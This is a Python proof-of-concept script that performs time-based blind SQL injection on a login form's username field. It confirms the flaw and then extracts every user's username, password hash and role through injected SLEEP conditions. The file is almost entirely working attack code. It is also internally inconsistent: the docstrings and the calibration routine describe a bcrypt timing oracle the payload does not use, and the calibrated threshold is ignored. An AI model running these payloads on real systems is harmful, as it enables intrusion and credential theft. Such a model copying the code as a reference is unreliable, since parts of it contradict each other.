
#!/usr/bin/env python3
"""
PoC: Boolean-based Blind SQL Injection
Target: POST /login (parameter: username)
Purpose: Proof of Concept for an SQL Injection vulnerability
         in an authorized testing environment.

Usage: python3 sqli_poc.py
"""

import requests
import string
import time


# ==== Target Configuration - Adjust according to your environment ====
TARGET_URL = "http://localhost:3000/login"
KNOWN_USER_TABLE_COLUMN = "username"   # Column targeted during extraction
TARGET_USERNAME = "admin"              # Target username
DUMMY_PASSWORD = "irrelevant"          # Any value; does not affect the boolean check
CHARSET = string.printable[:95]         # Possible characters in bcrypt hashes / general text
MAX_LEN = 100                           # Maximum value length to prevent infinite loops
TIMING_THRESHOLD = 0.05                 # Timing threshold in seconds
                                        # Adjust using calibrate_threshold()

def send_payload(condition_sql: str) -> bool:
    payload_username = f"' OR IF({condition_sql}, SLEEP(3), 0) -- "
    data = {"username": payload_username, "password": DUMMY_PASSWORD}

    start = time.perf_counter()
    requests.post(TARGET_URL, data=data, allow_redirects=False)
    elapsed = time.perf_counter() - start

    return elapsed > 1.5  # عتبة أوضح بكتير من timing bcrypt لأن SLEEP دقيق ومضمون

def calibrate_threshold(samples: int = 5):
    """
    Calibrates the timing threshold.

    The function measures the average response time for:

    1. A condition that is definitely false
       -> bcrypt should not be executed.

    2. A condition that is definitely true
       -> bcrypt should be executed.

    The midpoint between both averages is used as the
    TIMING_THRESHOLD.
    """

    print("[*] Calibrating timing threshold...")

    false_times = []
    true_times = []

    for _ in range(samples):

        # False condition
        t0 = time.perf_counter()

        requests.post(
            TARGET_URL,
            data={
                "username": "' AND '1'='2",
                "password": DUMMY_PASSWORD
            }
        )

        false_times.append(time.perf_counter() - t0)

        # True condition
        t0 = time.perf_counter()

        requests.post(
            TARGET_URL,
            data={
                "username": "' OR '1'='1",
                "password": DUMMY_PASSWORD
            }
        )

        true_times.append(time.perf_counter() - t0)

    avg_false = sum(false_times) / len(false_times)
    avg_true = sum(true_times) / len(true_times)

    print(
        f"    Average response time "
        f"(false condition - no sleep): {avg_false:.4f} seconds"
    )

    print(
        f"    Average response time "
        f"(true condition - sleep executed): {avg_true:.4f} seconds"
    )

    print(
        f"    Difference: {avg_true - avg_false:.4f} seconds\n"
    )

    if avg_true - avg_false < 0.01:
        print(
            "[-] The timing difference is too small. "
            "Check the bcrypt configuration or increase "
            "the number of samples.\n"
        )

    return (avg_false + avg_true) / 2


def extract_length(column: str, where_clause: str) -> int:
    """
    Extracts the length of a specific column value using binary search.

    The WHERE clause is kept flexible so the function can be reused
    for different rows.
    """

    low, high = 0, MAX_LEN

    while low < high:

        mid = (low + high) // 2

        condition = (
            f"(SELECT LENGTH({column}) "
            f"FROM users "
            f"WHERE {where_clause})>{mid}"
        )

        if send_payload(condition):
            low = mid + 1
        else:
            high = mid

        # Slight delay to reduce server load
        time.sleep(0.02)

    return low


def extract_value(
    column: str,
    where_clause: str,
    length: int
) -> str:
    """
    Extracts a column value character by character.

    Each character is determined using ASCII comparison
    combined with binary search.
    """

    extracted = ""

    for pos in range(1, length + 1):

        # Printable ASCII range
        low, high = 32, 126

        while low < high:

            mid = (low + high) // 2

            condition = (
                f"(SELECT ASCII(SUBSTRING("
                f"{column},{pos},1)) "
                f"FROM users "
                f"WHERE {where_clause})>{mid}"
            )

            if send_payload(condition):
                low = mid + 1
            else:
                high = mid

        extracted += chr(low)

    return extracted


def extract_row_count() -> int:
    """
    Extracts the total number of rows in the users table
    using binary search.
    """

    print("[*] Extracting the total number of rows in the users table...")

    low, high = 0, 1000

    while low < high:

        mid = (low + high) // 2

        condition = (
            f"(SELECT COUNT(*) FROM users)>{mid}"
        )

        if send_payload(condition):
            low = mid + 1
        else:
            high = mid

        time.sleep(0.02)

    print(f"[+] Total rows: {low}\n")

    return low


def dump_all_users():
    """
    Extracts all rows from the users table.

    The following fields are extracted:

    - username
    - password hash
    - role

    LIMIT offset,1 is used to iterate through the rows
    in ID order.
    """

    total = extract_row_count()

    results = []

    for i in range(total):

        print(
            f"[*] Extracting row {i + 1} of {total}..."
        )

        where = f"1=1 ORDER BY id LIMIT {i},1"

        # Extract username
        username_length = extract_length(
            "username",
            where
        )

        username = (
            extract_value(
                "username",
                where,
                username_length
            )
            if username_length > 0
            else ""
        )

        # Extract password hash
        password_length = extract_length(
            "password",
            where
        )

        password_hash = (
            extract_value(
                "password",
                where,
                password_length
            )
            if password_length > 0
            else ""
        )

        # Extract role
        role_length = extract_length(
            "role",
            where
        )

        role = (
            extract_value(
                "role",
                where,
                role_length
            )
            if role_length > 0
            else ""
        )

        print(f"    Username: {username}")
        print(f"    Password hash: {password_hash}")
        print(f"    Role: {role}\n")

        results.append({
            "username": username,
            "password_hash": password_hash,
            "role": role
        })

    return results


def confirm_vulnerability():
    """
    Performs the initial vulnerability confirmation.

    It compares an always-true SQL condition with
    an always-false SQL condition.
    """

    always_true = send_payload("'1'='1'")
    always_false = send_payload("'1'='2'")

    print("[*] Initial vulnerability confirmation:")

    print(
        f"    Always-true condition ('1'='1') -> "
        f"{'Success (True)' if always_true else 'Failed (False)'}"
    )

    print(
        f"    Always-false condition ('1'='2') -> "
        f"{'Success (True)' if always_false else 'Failed (False)'}"
    )

    if always_true and not always_false:

        print(
            "[+] Boolean-based Blind SQL Injection confirmed.\n"
        )

        return True

    else:

        print(
            "[-] The behavior does not match Blind SQL Injection. "
            "Check the configuration or target.\n"
        )

        return False


if __name__ == "__main__":

    print("=" * 60)
    print(" Blind SQL Injection PoC - /login username parameter")
    print(" (Timing-based Oracle: bcrypt.compare() execution delay)")
    print("=" * 60)

    # Calibrate the timing threshold using the target environment
    TIMING_THRESHOLD = calibrate_threshold()

    globals()["TIMING_THRESHOLD"] = TIMING_THRESHOLD

    print(
        f"[*] Using timing threshold: "
        f"{TIMING_THRESHOLD:.4f} seconds\n"
    )

    if confirm_vulnerability():

        all_users = dump_all_users()

        print("=" * 60)
        print(" Final Results - Extracted rows from the users table")
        print("=" * 60)

        for idx, row in enumerate(all_users, start=1):

            print(
                f"[{idx}] "
                f"username={row['username']} | "
                f"password_hash={row['password_hash']} | "
                f"role={row['role']}"
            )

    else:

        print(
            "[-] Vulnerability could not be confirmed. "
            "Stopping execution."
        )
